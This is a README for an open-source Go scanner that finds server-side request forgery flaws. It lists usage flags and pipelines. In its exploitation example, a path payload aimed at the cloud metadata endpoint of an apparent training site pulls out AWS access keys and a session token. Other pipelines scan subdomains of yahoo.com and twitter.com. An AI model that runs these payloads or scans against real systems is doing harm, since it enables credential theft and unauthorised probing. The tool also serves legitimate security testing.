# SSRF Detector Tool

A SSRF detector tool written in golang. I have fixed some errors and added some more payloads into it. But the tool credits goes to [z0idsec](https://twitter.com/z0idsec).

### Upcoming Features
- Fetch endpoints from Javascript files ✅ 
- Bruteforce parameters ✅ 
- Find SSRF in those parameters ✅ 
- Match multiple patterns in the response ✅ 
- Check Post Request ❌
- Check Headers ❌

### Features
- Wordlist Creation
- Inject in every parameter one by one
- Very fast speed
- Inject into paths
- Silent Mode
- Fetch endpoints from Javascript files 
- Bruteforce parameters  
- Find SSRF in those parameters 
- Match multiple patterns in the response

### Note

Make sure when creating wordlists or finding ssrf with my tool that the domains are resolved.
You can use:
- [httpx](https://github.com/projectdiscovery/httpx)
- [httprobe](https://github.com/tomnomnom/httprobe)
- [massdns](https://github.com/blechschmidt/massdns)

To do so. Also, Make sure to customerise your patterns file for greater results.

+ **Installation**
    
    ```sh
    git clone https://github.com/R0X4R/ssrf-tool.git
    cd ssrf-tool
    go build ssrftool.go && mv ssrftool /usr/bin/
    ```
    You can also download the precompiled binary file [binary](https://github.com/R0X4R/ssrf-tool/releases)
    
+ **Usage**

    ```sh
    █▀ █▀ █▀█ █▀▀
    ▄█ ▄█ █▀▄ █▀░

        v1.2 - @z0idsec (fixed by @R0X4R)

    [WRN] Use with caution. You are responsible for your actions
    [WRN] Developers assume no liability and are not responsible for any misuse or damage.

    Usage of ./ssrftool:
    -append
            Append the payload to the parameter
    -brute
            Brute force parameters against endpoints to find SSRF
    -concurrency int
            Set the concurrency for greater speeds (default 30)
    -domains string
            The list of subdomains
    -gen
            Generate a SSRF wordlist to be used
    -parameters string
            The parameters list
    -paths
            (true or false) for testing paths or parameters
    -pattern string
            Match the response with a pattern (e.g.) 'Success:'
    -patterns string
            Match the response with a list of patterns
    -payloads string
            The payloads list
    -silent
            silent output
    ```
  
    **Payloads and patterns files:** [https://github.com/R0X4R/ssrf-tool/tree/main/important](https://github.com/R0X4R/ssrf-tool/tree/main/important)
    
    **Exploitation**
    
    ```sh
    end@root:~$ ./ssrftool -domains domains -paths=true -payloads payloads.txt -patterns patterns.txt


    █▀ █▀ █▀█ █▀▀
    ▄█ ▄█ █▀▄ █▀░

        v1.2 - @z0idsec (fixed by @R0X4R)

    [WRN] Use with caution. You are responsible for your actions
    [WRN] Developers assume no liability and are not responsible for any misuse or damage.

    >  Testing  http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy//169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
    {
      "Code" : "Success",
      "LastUpdated" : "2021-02-10T03:03:06Z",
      "Type" : "AWS-HMAC",
      "AccessKeyId" : "ASIA6GG7PSQGZ6OYP77X",
      "SecretAccessKey" : "48Qe7eyMwWzPz8FiwtH+RQIaDtZPZf1DVCEiMia9",
      "Token" : "IQoJb3JpZ2luX2VjEKP//////////wEaCXVzLXdlc3QtMiJHMEUCIBnoKbpbPT/h7JXCay5G1ErKcTpB7xQNx07pz84Y18GBAiEAwAlKQPsog/ESCNoXGY1RMyJgJlK2Rq7gNoYjpVPxuAYqvQMInP//////////ARABGgw5NzU0MjYyNjIwMjkiDG1GDv5XTUNfbXAlJSqRAzFe/7GMnB9DakVDBXSbYfyOKtFiC1TG6wmgGZREXpvwveF2Yt9fjFE/NohaaZQP5HPJo/pXHRlVzIQ41I5RbacDhzsACvS5VJwU1mjAteQY/TRkL+5qHYhM0bjDo1pqRCDvRuBmd5uC0OExkQCu55K4uo8qetjYYdfJ5pgPK2hKUyWYfHxwHa2JPNsst3L6oeRp8bzDk3DNipsFan9S0Umz/rfP1rRziUfKKRDBPyzx0wpjtFdC5yjV+O1UMLZ2Qn1ANmp/Otr3UhYu2ssdR/a9a+kE6pi0Qmi/JKfz/6ovIafXm8/a6gisIqEHZ02TrserNdccwqcbNP7mRCFFJzjp93bJkK30xLa7LMOkY4HSYoFyyPSOibAK5XX/mnlxKxQvK2r+mvvelUglEGe9m59Dp+OhYrhFXTvABNy64AnrvsJRA06D5o0nZECL39JuEYfUj1gKHYjL7iS5GfmPqGhIx9zzpC6UB0veh3UQhCqMz0GxqfHoYa+jfei2hYbe/QJVrme0OwGxz8l1qmumF7ohML+ZjYEGOusBlnslmeGXBJN/sGYhqCXXKzyX6oBmW5avOgp8ztsMTPMVICgA4nTep1ZN/q9hyB7CkdZ1GjWoHCCfd+MqxEEszxVawtrMFZSmx82OlfIfB13JQr95Ezk0FhrPu2TsARWUQTPWpXtu9kMFr36CHUqBCQ2agZhhoYk6brjz9I4d0gz4Qj1rY/ZB69rYGALRgty8cTJLGcwJ5CRddoeaiodBsroui19w5NyC3S3oRHP49rYAY8cYqCGGvTvwtbk1H6+p+dkC22wBlMsY/uwdGr6hnaVHYCc3Pr1ewIj/9iuYloEJOHweJy7uRl8dSA==",
      "Expiration" : "2021-02-10T09:26:50Z"
    }
    VULNERABLE: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy//169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
    ```


+ **Find SSRF in paths with Subfinder, httpx**

    ```sh
    subfinder -d yahoo.com -silent | httpx -silent >> domains | ssrf-tool -domains domains -payloads ssrf.txt -silent=false -paths=true -patterns patterns.txt
    ```

+ **Wordlist Creation**

    ```sh
    echo "https://www.twitter.com" | getJS -complete | ssrf-tool -gen=true
    ```

    Can be used with other tools like subfinder & amass

+ **BruteForce For SSRF**

    ```sh
    echo "https://www.twitter.com" | getJS -complete | anew domains | ssrftool -domains domains -silent=false -brute=true -gen=true -patterns patterns.txt  -parameters params.txt
    ```

+ **Testing The Paths**

    ```sh
    ssrftool -domains domains -silent=false -patterns patterns.txt -paths=true  -brute=false -payloads ssrf.txt
    ```

+ **Testing Parameters with waybackurls**

    ```sh
    echo "twitter.com" | waybackurls >> domains; ssrftool -domains domains -silent=false -paths=false -payloads ssrf.txt
    ```

**Credits:** 
[@z0idsec](https://twitter.com/z0idsec)    [@ethicalhackingplayground](https://github.com/ethicalhackingplayground/)
